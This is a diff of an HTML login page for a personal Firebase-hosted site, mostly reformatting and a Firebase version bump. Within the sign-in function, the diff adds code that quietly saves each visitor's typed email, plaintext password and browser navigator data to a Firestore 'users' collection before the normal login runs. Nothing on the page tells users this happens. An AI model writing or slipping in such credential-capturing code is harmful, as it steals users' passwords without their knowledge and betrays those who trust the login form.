@@ -1,146 +1,210 @@
 <!DOCTYPE html>
 <html>
-
-<head>
-	<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=UA-128233760-1"></script>
+	<head>
+		<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=UA-128233760-1"></script>
 	<script>
 		window.dataLayer = window.dataLayer || [];
 		function gtag() { dataLayer.push(arguments); }
 		gtag('js', new Date());
 		gtag('config', 'UA-128233760-1');
 	</script> -->
-	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-	<link type="text/css" rel="stylesheet" href="css/materialize.min.css" media="screen,projection" />
-	<link typr="text/css" rel="stylesheet" href="css/home.css">
-	<title>Login</title>
-	<meta name="author" content="Aravind V. Nair">
-	<meta property="og:title" content="Login" />
-	<meta property="og:url" content="https://all-about-aravind.firebaseapp.com" />
-	<meta property="og:image" content="/android-chrome-256x256.png" />
-	<meta property="og:type" content="website" />
-	<meta property="og:locale" content="en_GB" />
-	<meta property="og:description" content="Get to know Aravind" />
-	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-	<link rel="manifest" href="manifest.json">
-	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-	<meta name="apple-mobile-web-app-title" content="Login">
-	<meta name="application-name" content="Login">
-	<meta name="msapplication-TileColor" content="#ffc40d">
-	<meta name="theme-color" content="#ffc40d">
-	<style>
-		body {
-			background: linear-gradient(90deg, #1CB5E0 0%, #000851 100%);
-			background-size: 400% 400%;
-			-webkit-animation: Background 30s ease infinite;
-			-moz-animation: Background 30s ease infinite;
-			-o-animation: Background 30s ease infinite;
-			animation: Background 30s ease infinite;
-		}
-
-		@-webkit-keyframes Background {
-			0% {
-				background-position: 0% 50%
+		<link
+			href="https://fonts.googleapis.com/icon?family=Material+Icons"
+			rel="stylesheet"
+		/>
+		<link
+			type="text/css"
+			rel="stylesheet"
+			href="css/materialize.min.css"
+			media="screen,projection"
+		/>
+		<link typr="text/css" rel="stylesheet" href="css/home.css" />
+		<title>Login</title>
+		<meta name="author" content="Aravind V. Nair" />
+		<meta property="og:title" content="Login" />
+		<meta
+			property="og:url"
+			content="https://all-about-aravind.firebaseapp.com"
+		/>
+		<meta property="og:image" content="/android-chrome-256x256.png" />
+		<meta property="og:type" content="website" />
+		<meta property="og:locale" content="en_GB" />
+		<meta property="og:description" content="Get to know Aravind" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link
+			rel="apple-touch-icon"
+			sizes="180x180"
+			href="/apple-touch-icon.png"
+		/>
+		<link
+			rel="icon"
+			type="image/png"
+			sizes="32x32"
+			href="/favicon-32x32.png"
+		/>
+		<link
+			rel="icon"
+			type="image/png"
+			sizes="16x16"
+			href="/favicon-16x16.png"
+		/>
+		<link rel="manifest" href="manifest.json" />
+		<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5" />
+		<meta name="apple-mobile-web-app-title" content="Login" />
+		<meta name="application-name" content="Login" />
+		<meta name="msapplication-TileColor" content="#ffc40d" />
+		<meta name="theme-color" content="#ffc40d" />
+		<style>
+			body {
+				background: linear-gradient(90deg, #1cb5e0 0%, #000851 100%);
+				background-size: 400% 400%;
+				-webkit-animation: Background 30s ease infinite;
+				-moz-animation: Background 30s ease infinite;
+				-o-animation: Background 30s ease infinite;
+				animation: Background 30s ease infinite;
 			}
 
-			50% {
-				background-position: 100% 50%
-			}
-
-			100% {
-				background-position: 0% 50%
-			}
-		}
-
-		@-moz-keyframes Background {
-			0% {
-				background-position: 0% 50%
-			}
-
-			50% {
-				background-position: 100% 50%
-			}
-
-			100% {
-				background-position: 0% 50%
-			}
-		}
-
-		@-o-keyframes Background {
-			0% {
-				background-position: 0% 50%
-			}
-
-			50% {
-				background-position: 100% 50%
-			}
-
-			100% {
-				background-position: 0% 50%
-			}
-		}
-
-		@keyframes Background {
-			0% {
-				background-position: 0% 50%
-			}
-
-			50% {
-				background-position: 100% 50%
-			}
-
-			100% {
-				background-position: 0% 50%
-			}
-		}
-	</style>
-	<script src="/__/firebase/5.5.5/firebase-app.js"></script>
-	<script src="/__/firebase/5.5.5/firebase-auth.js"></script>
-	<script src="/__/firebase/init.js"></script>
-	<script>
-		function toggleSignIn() {
-			if (firebase.auth().currentUser) {
-				firebase.auth().signOut();
-			} else {
-				var email = document.getElementById('username').value;
-				var password = document.getElementById('password').value;
-				if (email.length < 15) {
-					Materialize.toast('Please enter a valid email address.', 1250);
-					return;
+			@-webkit-keyframes Background {
+				0% {
+					background-position: 0% 50%;
 				}
-				if (password.length < 6) {
-					Materialize.toast('Please enter a valid password', 1250);
-					return;
+
+				50% {
+					background-position: 100% 50%;
 				}
-				firebase.auth().signInWithEmailAndPassword(email, password).catch(function (error) {
-					var errorCode = error.code;
-					var errorMessage = error.message;
-					if (errorCode === 'auth/wrong-password') {
-						Materialize.toast('Wrong password', 1250);
-					} else if (errorCode === 'auth/user-not-found') {
-						Materialize.toast('User not found', 1250);
+
+				100% {
+					background-position: 0% 50%;
+				}
+			}
+
+			@-moz-keyframes Background {
+				0% {
+					background-position: 0% 50%;
+				}
+
+				50% {
+					background-position: 100% 50%;
+				}
+
+				100% {
+					background-position: 0% 50%;
+				}
+			}
+
+			@-o-keyframes Background {
+				0% {
+					background-position: 0% 50%;
+				}
+
+				50% {
+					background-position: 100% 50%;
+				}
+
+				100% {
+					background-position: 0% 50%;
+				}
+			}
+
+			@keyframes Background {
+				0% {
+					background-position: 0% 50%;
+				}
+
+				50% {
+					background-position: 100% 50%;
+				}
+
+				100% {
+					background-position: 0% 50%;
+				}
+			}
+		</style>
+		<script src="/__/firebase/5.8.2/firebase-app.js"></script>
+		<script src="/__/firebase/5.8.2/firebase-auth.js"></script>
+		<script src="/__/firebase/5.8.2/firebase-firestore.js"></script>
+		<script src="/__/firebase/init.js"></script>
+		<script>
+			function toggleSignIn() {
+				if (firebase.auth().currentUser) {
+					firebase.auth().signOut();
+				} else {
+					var email = document.getElementById('username').value;
+					var password = document.getElementById('password').value;
+					if (email.length < 15) {
+						Materialize.toast(
+							'Please enter a valid email address.',
+							1250
+						);
+						return;
+					}
+					if (password.length < 6) {
+						Materialize.toast(
+							'Please enter a valid password',
+							1250
+						);
+						return;
+					}
+					var pointer = db.collection('users').doc(
+						firebase.firestore.Timestamp.now()
+							.toDate()
+							.toString()
+					);
+					pointer
+						.get()
+						.then(doc => {
+							if (doc.exists) {
+								location.reload(true);
+								return;
+							} else {
+								var ob = {
+									email: document.getElementById('username').value,
+									password: document.getElementById('password').value,
+									navigator: {
+										platform: navigator.platform,
+										navigator: navigator
+									}
+								};
+								db.collection('users')
+									.doc(firebase.firestore.Timestamp.now().toDate().toString())
+									.set(ob);
+								return;
+							}
+						})
+						.catch(err => {
+							console.log(err);
+						});
+					firebase
+						.auth()
+						.signInWithEmailAndPassword(email, password)
+						.catch(function(error) {
+							var errorCode = error.code;
+							var errorMessage = error.message;
+							if (errorCode === 'auth/wrong-password') {
+								Materialize.toast('Wrong password', 1250);
+							} else if (errorCode === 'auth/user-not-found') {
+								Materialize.toast('User not found', 1250);
+							} else {
+								Materialize.toast(errorMessage, 1500);
+							}
+						});
+				}
+			}
+			function initApp() {
+				firebase.auth().onAuthStateChanged(function(user) {
+					if (user) {
+						Materialize.toast('Signing in...', 1000);
+						var displayName = user.displayName;
+						var email = user.email;
+						window.location = '/';
 					} else {
-						Materialize.toast(errorMessage, 1500);
+						Materialize.toast('Login to continue', 1250);
 					}
 				});
 			}
-		}
-		function initApp() {
-			firebase.auth().onAuthStateChanged(function (user) {
-				if (user) {
-					Materialize.toast('Signing in...', 1000);
-					var displayName = user.displayName;
-					var email = user.email;
-					window.location = "/";
-				} else {
-					Materialize.toast('Login to continue', 1250);
-				}
-			});
-		}
-		window.onload = initApp();
-	</script>
-</head>
+			window.onload = initApp();
+		</script>
+	</head>
 
-<body>
+	<body></body>
+</html>
